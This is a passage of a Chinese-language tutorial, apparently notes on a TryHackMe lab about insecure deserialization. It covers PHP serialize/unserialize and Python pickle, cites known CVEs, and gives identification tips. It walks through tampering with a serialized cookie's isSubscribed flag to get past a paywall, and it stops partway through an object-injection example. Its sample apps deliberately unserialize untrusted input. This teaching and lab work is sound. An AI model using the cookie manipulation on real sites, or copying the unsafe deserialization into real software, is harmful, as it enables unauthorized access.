src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241203175326.png" alt="image.png"></a></p><p>在编程中，序列化是将对象的状态转换为人类可读或二进制格式（或两者的混合）的过程，这些格式可以在需要时存储或传输和重建。在必须在系统的不同部分之间或跨网络传输数据的应用程序（例如基于 Web 的应用程序）中，此功能至关重要。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$noteArray</span> = <span class="keyword">array</span>(<span class="string">&quot;title&quot;</span> =&gt; <span class="string">&quot;My THM Note&quot;</span>, <span class="string">&quot;content&quot;</span> =&gt; <span class="string">&quot;Welcome to THM!&quot;</span>); <span class="variable">$serialisedNote</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$noteArray</span>); <span class="comment">// Converting the note into a storable format file_put_contents(&#x27;note.txt&#x27;, $serialisedNote); // Saving the serialised note to a file ?&gt;</span></span><br></pre></td></tr></table></figure><p>以下输出显示文件中的序列化字符串，其中包括注释的结构和内容的详细信息。它的存储方式可以轻松保存或传输。<code>note.txt</code></p><p><strong>序列号注释</strong>：<code>a:2:&#123;s:5:&quot;title&quot;;s:12:&quot;My THM Note&quot;;s:7:&quot;content&quot;;s:12:&quot;Welcome to THM!&quot;;&#125;</code></p><p>反序列化</p><p>想象一下，你到达学校，需要你今天早上打包的所有东西。反序列化就像你上课时打开书包;您取出每件物品，以便您可以全天使用。当您打开包包去拿书和午餐时，反序列化会获取打包的数据并将其转换回您可以使用的数据。反序列化是将格式化数据转换回对象的过程。它对于从文件、数据库或跨网络检索数据，将其恢复到其原始状态以供应用程序使用至关重要。</p><p>按照我们前面的例子，以下是如何在 PHP 中反序列化 note 数据：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$serialisedNote</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;note.txt&#x27;</span>);  <span class="comment">// Reading the serialised note from the file</span></span><br><span class="line"><span class="variable">$noteArray</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialisedNote</span>);  <span class="comment">// Converting the serialised string back into a PHP array</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Title: &quot;</span> . <span class="variable">$noteArray</span>[<span class="string">&#x27;title&#x27;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Content: &quot;</span> . <span class="variable">$noteArray</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此代码从文件中读取序列化的注释并将其转换回数组，从而有效地重建原始注释。讨论序列化还需要进行有关安全性的对话。就像您不希望有人篡改您的书包一样，不安全的反序列化可能会导致软件应用程序出现重大安全漏洞。攻击者可能会更改序列化对象以执行未经授权的操作或窃取数据。</p><p>涉及序列化漏洞的特定事件</p><p>让我们讨论一下序列化漏洞在网络安全漏洞或攻击中发挥关键作用的具体事件，强调安全序列化实践的重要性。这些示例说明了攻击者如何利用序列化缺陷来实现远程代码执行、数据泄露等。</p><p><strong>Log4j 漏洞 CVE-2021-44228</strong>  </p><ul><li><strong>事件</strong>：<a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">Log4j 漏洞</a>或 Log4Shell 是在 Apache Log4j 2 库（Java 应用程序中广泛使用的日志记录库）中发现的一个严重安全漏洞。该漏洞允许远程攻击者通过利用库的不安全反序列化功能在受影响的系统上执行任意代码。如果您想了解有关此漏洞的更多信息，请查看 <a href="https://tryhackme.com/r/room/solar">Solar 利用 log4j</a> 房间。</li><li><strong>冲击：</strong> 该漏洞促进了远程代码执行，使攻击者能够在受影响的系统上执行任意命令。这允许攻击者破坏关键基础设施，从而导致未经授权访问敏感数据、服务中断和潜在的供应链攻击。</li></ul><p><strong>WebLogic Server 远程代码执行 CVE-2015-4852</strong></p><ul><li><strong>事件</strong>：此漏洞与 <a href="https://www.oracle.com/security-alerts/alert-cve-2015-4852.html">Oracle WebLogic Server</a> 反序列化数据发送到 T3 协议的方式有关。攻击者可以向服务器发送恶意制作的对象，当反序列化时，会导致远程代码执行。</li><li><strong>影响</strong>：此漏洞被广泛利用，用于未经授权访问系统、部署勒索软件或窃取数据。它影响了未禁用易受攻击的服务或修补问题的所有 WebLogic Server 版本。</li></ul><p><strong>Jenkins Java 反序列化 CVE-2016-0792</strong></p><ul><li><strong>事件</strong>：<a href="https://www.tenable.com/plugins/nessus/89034">Jenkins</a> 是软件开发中使用的一种常用自动化服务器，它遇到了一个涉及 Java 反序列化的严重漏洞。攻击者可以将构建的序列化有效负载发送到 Jenkins CLI，当反序列化时，该 CLI 可能允许执行任意代码。</li><li><strong>影响</strong>：这允许攻击者执行 shell 命令，从而可能接管 Jenkins 服务器，该服务器通常可以广泛访问软件开发环境，包括源代码、构建系统和可能的部署环境。</li></ul><h2 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h2><p>虽然不同的编程语言可能使用不同的关键字和函数进行序列化，但基本原则是一致的。众所周知，序列化是将对象的状态转换为可以轻松存储或传输的格式，然后在以后重建的过程。无论是 Java、Python、.NET 还是 PHP，每种语言都实施序列化以适应其环境固有的特定功能或安全措施。<a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6eb6b58db4657f681b84ae0def396be4.png" title="different serialisation methods in different languages" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/6eb6b58db4657f681b84ae0def396be4.png" alt="different serialisation methods in different languages"></a></p><p>与其他利用用户输入的即时处理的常见漏洞不同，不安全的反序列化问题涉及与应用程序核心逻辑的更深层次交互，通常会操纵其组件的基本行为。  </p><p>现在，让我们探索一下如何在不同语言中显式处理序列化，探索其功能、语法和独特特性。</p><p>PHP序列化</p><p>在 PHP 中，序列化是使用函数完成的。此函数将 PHP 对象或数组转换为表示对象数据和结构的字节流。生成的字节流可以包括各种数据类型，例如字符串、数组和对象，使其唯一。为了说明这一点，让我们考虑一个 notes 应用程序，用户可以在其中保存和检索他们的 notes。我们将创建一个名为 <strong>Notes</strong> 的 PHP 类来表示每个注释并处理序列化和反序列化。<code>serialize()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Notescontent</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$content</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Notescontent = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在我们的 Notes 应用程序中，当用户保存笔记时，我们使用 PHP 的函数序列化 Notes 类对象。这会将对象转换为可以存储在文件或数据库中的字符串表示形式。让我们看一下以下序列化 Notes 类对象的代码片段：<code>serialize()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$note</span> = <span class="keyword">new</span> <span class="title class_">Notes</span>(<span class="string">&quot;Welcome to THM&quot;</span>);</span><br><span class="line"><span class="variable">$serialized_note</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$note</span>);</span><br></pre></td></tr></table></figure><p>访问链接并输入任何字符串以序列化或反序列化。例如，如果您输入字符串 <strong>Welcome to THM</strong>，它将生成如下所示的输出：<code>http://10.10.133.158/phptest/``O:5:&quot;Notes&quot;:1:&#123;s:7:&quot;content&quot;;s:14:&quot;Welcome to THM&quot;;&#125;</code></p><p><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8d20f7d66a362af30e482a3b81561ed3.png" title="notes app in PHP" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/8d20f7d66a362af30e482a3b81561ed3.png" alt="notes app in PHP"></a></p><p>让我们解码输出：</p><ul><li><code>O:5:&quot;Notes&quot;:1:</code>：这部分表示序列化数据表示 <strong>Notes</strong> 类的对象，该类具有一个属性。</li><li><code>s:7:&quot;content&quot;</code>：表示长度为 7 个字符的属性名称 “<strong>content</strong>”。在序列化数据中，字符串用 后跟字符串的长度和双引号中的字符串表示。整数表示，后跟不带引号的数值。<code>s``i</code></li><li><code>s:14:&quot;Welcome to THM&quot;</code>：这是 <strong>content</strong> 属性的值，长度为 14 个字符。</li></ul><p>神奇的方法</p><p>PHP 提供了几种<a href="https://www.php.net/manual/en/language.oop5.magic.php">神奇的方法</a>，它们在序列化过程中起着至关重要的作用。下面提到了一些重要的方法：<a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3eadbf114d33bd2c1feea8e41ff72d91.png" title="unserialise pre-req in PHP" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3eadbf114d33bd2c1feea8e41ff72d91.png" alt="unserialise pre-req in PHP"></a></p><ul><li><code>__sleep()</code>：此方法在序列化之前对对象调用。它可以清理资源，例如数据库连接，并期望返回应序列化的属性名称数组。</li><li><code>__wakeup()</code>：该方法在反序列化时调用。它可以重新建立对象可能需要正常运行的任何连接。</li><li><code>__serialize()</code>：从 PHP 7.4 开始，此方法允许你通过返回一个表示对象的序列化形式的数组来自定义序列化数据。</li><li><code>__unserialize()</code>：此对应项允许从对象的序列化数据中自定义对象的恢复。<code>__serialize()</code></li></ul><p>python</p><p>Python 使用一个名为 <strong>Pickle</strong> 的模块来序列化和反序列化对象。该模块将 Python 对象转换为字节流（反之亦然），使其能够保存到文件中或通过网络传输。Pickling 是 Python 开发人员的强大工具，因为它可以处理几乎所有类型的 Python 对象，而无需手动处理对象的状态。我们将在 Python 中遵循与 PHP 中相同的 notes 应用程序。以下是该类的代码片段：<code>app.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">serialized_data = request.form[<span class="string">&#x27;serialized_data&#x27;</span>]</span><br><span class="line">notes_obj = pickle.loads(base64.b64decode(serialized_data))</span><br><span class="line">message = <span class="string">&quot;Notes successfully unpickled.&quot;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;pickle&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        content = request.form[<span class="string">&#x27;note_content&#x27;</span>]</span><br><span class="line">        notes_obj.add_note(content)</span><br><span class="line">        pickled_content = pickle.dumps(notes_obj)</span><br><span class="line">        serialized_data = base64.b64encode(pickled_content).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        binary_data = <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;x:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> x <span class="keyword">in</span> pickled_content)</span><br><span class="line">        message = <span class="string">&quot;Notes pickled successfully.&quot;</span></span><br></pre></td></tr></table></figure><p><strong>酸洗工艺</strong></p><ul><li><strong>创建 Notes 类</strong>：此类管理注释列表。它提供了添加注释和检索所有注释的方法，从而可以轻松管理应用程序的状态。</li><li><strong>序列化 （Pickling）：</strong>当用户提交注释时，Notes 类实例（包括所有注释）将使用 .此函数将 Python 对象转换为二进制格式，以便 Python 稍后可以将其转换回对象。<code>pickle.dumps()</code></li></ul><p><strong>显示序列化数据 （base64 编码）</strong></p><ul><li><strong>为什么使用 base64</strong>：序列化数据是二进制的，不能在所有环境中安全地显示。二进制数据可能包含可能干扰通信协议（如 HTTP）的字节。Base64 是一种将二进制数据转换为纯文本的编码方案。它仅使用可读字符，因此可以安全地通过不支持二进制数据的通道进行传输。<a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/30c29d8133d4a8bcbd803c521b9e32be.png" title="pickle.load pre-req in Python" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/30c29d8133d4a8bcbd803c521b9e32be.png" alt="pickle.load pre-req in Python"></a></li><li><strong>编码过程</strong>：序列化对象后，使用 .此字符串可以安全地显示在 HTML 中，并且易于存储或传输。<code>Notes``base64.b64encode()</code></li></ul><p><strong>反序列化 （Unpickling）</strong></p><ul><li><strong>Base64 解码</strong>：解封时，首先使用 .<code>base64.b64decode()</code></li><li><strong>解封</strong>：然后将二进制数据传递给 ，后者从二进制流中重建原始 Python 对象。<code>pickle.loads()</code></li></ul><p>同样，访问链接并输入字符串 <strong>Welcome to THM</strong>：<code>http://10.10.133.158:5000</code></p><p><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/31e397f12ca8453606e381c3b19621a8.png" title="notes app in Python" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/31e397f12ca8453606e381c3b19621a8.png" alt="notes app in Python"></a>  </p><ul><li><strong>Pickling</strong>：当这个字符串被 pickle 时，它会被转换为人类不可读的二进制格式。此二进制格式包含有关数据类型、数据本身以及重建对象所需的其他必要元数据的信息。</li><li><strong>Base64 编码</strong>：然后将腌制数据的二进制形式编码为 Base64 字符串，该字符串可能类似于 .<code>gASVIQAAAAAAAACMBFdlbGNvbWXCoGFkZYFdcQAu</code></li></ul><p>在探索序列化格式时，我们讨论了如何在 PHP 和 Python 中实现这一关键功能。PHP 利用 and 函数来管理对象和其他数据类型到可以轻松重建的可存储格式的转换。同样，Python 使用该模块将对象序列化为字节流，并将它们反序列化回其原始状态。<code>serialize()``unserialize()``Pickle</code>  </p><p>除了这两种语言之外，序列化是各种编程环境的通用功能，每个环境都有独特的实现和库。在 Java 中，通过接口促进了对象序列化，允许将对象转换为字节流，反之亦然，这对于网络通信和数据持久性至关重要。对于 .NET，序列化多年来已经发生了重大变化。最初，通常用于二进制序列化;但是，出于安全考虑，现在不鼓励使用它。现代 .NET 应用程序通常用于 JSON 序列化，或用于 XML 任务的 <strong>System.Xml.Serialization</strong>，这反映了向更安全、更标准化的数据交换格式的转变。Ruby 的 模块以序列化和反序列化对象而闻名，对于更人类可读的格式，它通常使用 YAML。每种语言的序列化方法都反映了其使用上下文和安全注意事项，强调了理解和正确实施序列化以确保 Web 应用程序中数据的完整性和安全性的重要性。<code>Serializable``BinaryFormatter``System.Text.Json``Marshal</code></p><h2 id="鉴定"><a href="#鉴定" class="headerlink" title="鉴定"></a>鉴定</h2><p>在彻底了解不同编程语言的序列化之后，我们现在将过渡到网络安全的一个关键方面，利用和缓解与序列化相关的漏洞。在讨论漏洞利用技术的细节之前，了解如何识别应用程序中的这些漏洞至关重要，无论您是否可以访问代码（白盒测试）还是无法访问（黑盒测试）。  </p><p>访问源代码<a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f7fc8a78e53eaa644b6c8a9fb6d4369c.png" title="magnifying glass over digits" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/f7fc8a78e53eaa644b6c8a9fb6d4369c.png" alt="magnifying glass over digits"></a></p><p>当可以访问源代码时，识别序列化漏洞可能更直接，但需要敏锐地了解要查找的内容。例如，通过代码审查，我们可以对源代码进行 e xamine 以使用序列化函数，例如 、 、 ） 等。我们必须特别注意用户提供的 input 可能直接传递给这些函数的任何点。<code>serialize()``unserialize()``pickle.loads(</code></p><p>无法访问源代码</p><p>在审计应用程序而不访问其源代码时，挑战在于仅根据外部观察和交互推断它如何处理数据。这通常称为<strong>黑盒测试</strong>。在这里，我们专注于检测服务器响应和 Cookie 中的模式，这些模式可能表明使用了序列化和潜在漏洞。作为渗透测试人员，在 PHP 文件名末尾使用波浪号 是攻击者用来尝试访问文本编辑器或版本控制系统创建的备份或临时文件的常见技术。编辑或保存文件时，某些文本编辑器或版本控制系统可能会制作原始文件的备份副本，并在文件名后附加波浪号。<code>~</code></p><p><strong>分析 Server 响应</strong></p><ul><li><strong>错误消息</strong>： 某些错误消息可以间接指示序列化问题。例如，PHP 可能会抛出错误或警告，其中包含诸如 Object <strong>deserialisation error</strong> 之类的短语，这些是底层序列化过程和潜在漏洞点的泄露。<code>**unserialize()**</code></li><li><strong>应用程序行为的不一致</strong>：响应纵的输入（例如，修改的 cookie 或 POST 数据）的意外行为可能表明数据反序列化和处理方式存在问题。观察应用程序如何处理更改的序列化数据可以提供有关可能易受攻击的代码的线索。</li></ul><p><strong>检查 Cookie</strong></p><p>Cookie 通常用于在 Web 应用程序中存储序列化数据。通过检查 cookie 的内容，通常可以推断：</p><ul><li><strong>Cookie 中的 Base64 编码值（PHP 和 .NET）：</strong>如果 Cookie 包含看起来经过 base64 编码的数据，则解码可能会显示序列化对象或数据结构。PHP 经常使用序列化进行会话管理，并以序列化格式存储会话变量。</li><li><strong>ASP.NET 视图状态</strong>：.NET 应用程序可能会在发送到客户端浏览器的视图状态中使用序列化。有时可以看到一个名为 的字段，该字段是 base64 编码的。解码和检查它可以揭示它是否包含可能被利用的序列化数据。<code>__VIEWSTATE</code></li></ul><p>在此任务中，我们学习了如何识别漏洞。在接下来的任务中，我们将研究利用此漏洞的各种技术。</p><h2 id="利用-更新属性"><a href="#利用-更新属性" class="headerlink" title="利用 - 更新属性"></a>利用 - 更新属性</h2><p>在本任务中，我们将探索 PHP 中的一个实际示例，使用一个简单的笔记共享应用程序作为我们的案例研究。我们的笔记共享应用程序允许用户轻松创建、保存和共享笔记。用户可以将他们的笔记输入到应用程序中，然后保存以备将来参考。此外，用户可以与他人共享他们的笔记，从而促进协作和信息交换。该应用程序还包括基于订阅的功能，确保只有订阅的用户才能访问某些功能，例如笔记共享。您可以通过访问访问该网站 链接 .<code>http://10.10.133.158/case1</code></p><p><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/d3b4a29dd4ca6d3357f3b5372e368468.png" title="notes-sharing app in PHP" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/d3b4a29dd4ca6d3357f3b5372e368468.png" alt="notes-sharing app in PHP"></a></p><p>让我们看看应用程序是如何构建的。</p><p><strong>定义 Notes 类</strong></p><p>该应用程序有一个类，表示应用程序中的注释。此类具有三个私有属性：、 和 。我们还有 setter 和 getter 方法来操作属性。<code>Notes``user``role``isSubscribed``isSubscribed</code>  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$role</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isSubscribed</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$role</span>, <span class="variable">$isSubscribed</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;role = <span class="variable">$role</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isSubscribed = <span class="variable">$isSubscribed</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setIsSubscribed</span>(<span class="params"><span class="variable">$isSubscribed</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isSubscribed = <span class="variable">$isSubscribed</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getIsSubscribed</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isSubscribed;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在 Cookie 中存储用户数据</strong></p><p>当用户第一次访问我们的应用程序时，它会设置一个包含其用户数据的序列化 cookie。这包括其用户名、角色和订阅状态 （）。如果用户是付费会员 （<strong>isSubscribed &#x3D; true</strong>），则允许他们共享笔记。<code>isSubscribed</code></p><p><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e5ce341b090b04e5749ad1834199bba2.png" title="Inspect element tab for viewing cookies" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/e5ce341b090b04e5749ad1834199bba2.png" alt="Inspect element tab for viewing cookies"></a>  </p><p><strong>利用漏洞</strong></p><p>在此步骤中，我们将说明攻击者如何通过修改序列化 cookie 值来利用漏洞来获得对共享笔记的未经授权的访问权限。</p><ul><li><strong>序列化 cookie</strong>：解码 base64 编码的 cookie 值后，我们获得 Notes 对象的以下序列化表示：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Notes&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;role&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;isSubscribed&quot;</span>;b:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><p>正如我们已经知道的，在 PHP 序列化中，类名在属性名前面加上前缀，以防它不是公开的，以确保唯一性并帮助反序列化。这是 PHP 在内部处理对象序列化和反序列化的一部分。当一个对象被序列化时，PHP 会存储对象的属性和类名。这确保了当对象稍后被反序列化时，PHP 知道要实例化哪个类以及如何将序列化数据正确地分配给对象的属性。让我们将序列化的 note 分解为它的各个组成部分：</p><ul><li><strong>O：5：“Notes”：3</strong>： 这表示类名为 Notes 的对象 （O），该对象具有三个属性。</li><li><strong>s：4：“用户”;s：5：“guest”</strong>：这表示长度为 4 个字符的字符串，表示值为 “<strong>guest</strong>” 的属性。<code>user</code></li><li><strong>s：4：“角色”;s：5：“guest”</strong>：与上一个类似，它表示值为 “<strong>guest</strong>” 的属性。<code>role</code></li><li><strong>s：12：“isSubscribed”;b：0</strong>：这表示一个布尔值 （b） 属性，其值为 false （0）。<code>isSubscribed</code></li></ul><p>利用漏洞</p><p>在当前场景中，当用户想要尝试共享笔记时，他们会收到以下弹出窗口：</p><p><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9bfc64dfa33447bc22bb8adb2b37ca9c.png" title="Pop-up stating Please subscribe to share the note" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9bfc64dfa33447bc22bb8adb2b37ca9c.png" alt="Pop-up stating Please subscribe to share the note"></a>  </p><p>现在，后端发生了什么？后端 PHP 代码验证传入的 cookie，对其进行反序列化，然后验证用户是否已订阅。我们的主要任务是绕过这一点。</p><p>假设攻击者拦截了这个序列化的 cookie 值，并将属性从 false （0） 修改为 true （1）。攻击者可以通过更改序列化数据中的布尔值，在未经合法授权的情况下操纵订阅状态。<code>isSubscribed</code></p><p><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3bc45283cd430f96411a2b62afa41cf6.png" title="pop-up with flag value" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/3bc45283cd430f96411a2b62afa41cf6.png" alt="pop-up with flag value"></a></p><p>修改后，攻击者将再次对序列化数据进行 base64 编码，并将原始 cookie 值替换为修改后的 cookie 值。这将授予他们在未经授权的情况下在其他平台上共享笔记的权限，从而绕过预期的订阅限制。</p><h2 id="利用-对象注入"><a href="#利用-对象注入" class="headerlink" title="利用 - 对象注入"></a>利用 - 对象注入</h2><p>对象注入是由于 Web 应用程序中不安全的数据反序列化而引起的漏洞。当不受信任的数据被反序列化为对象时，攻击者可以操纵序列化数据来执行任意代码，从而导致严重的安全风险。在本任务中，我们将探索对象注入的工作原理，并通过一个简单的 PHP 代码片段演示其影响。</p><p>众所周知，该漏洞来自序列化和反序列化过程，该过程允许将 PHP 对象转换为可存储格式（序列化）并重建回对象（反序列化）。虽然序列化和反序列化对于数据存储和传输很有用，但如果实施不当，它们也会带来安全风险。</p><p>要利用 PHP 对象注入漏洞，应用程序应包含一个具有 PHP 魔术方法（如 或 ）的类，该方法可被用于恶意目的。在调用该方法之前，应声明所有涉及攻击的类（除非支持对象自动加载）。<code>__wakeup``__sleep``unserialize()</code>  </p><p><strong>例</strong></p><p>让我们考虑一个代码片段，它显示了使用 and 函数的序列化和反序列化。该代码接受 <strong>GET</strong> 参数 <strong>decode</strong> 或 <strong>encode</strong>，并相应地转换用户提供的值。<code>index.php``serialize()``unserialize()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserData</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">..</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;test.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;encode&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$userData</span> = <span class="keyword">new</span> <span class="title class_">UserData</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;encode&#x27;</span>]);</span><br><span class="line">    <span class="variable">$serializedData</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$userData</span>);</span><br><span class="line">    <span class="variable">$base64EncodedData</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serializedData</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Normal Data: &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;encode&#x27;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Serialized Data: &quot;</span> . <span class="variable">$serializedData</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Base64 Encoded Data: &quot;</span> . <span class="variable">$base64EncodedData</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;decode&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$base64EncodedData</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;decode&#x27;</span>];</span><br><span class="line">    <span class="variable">$serializedData</span> = <span class="title function_ invoke__">base64_decode</span>(<span 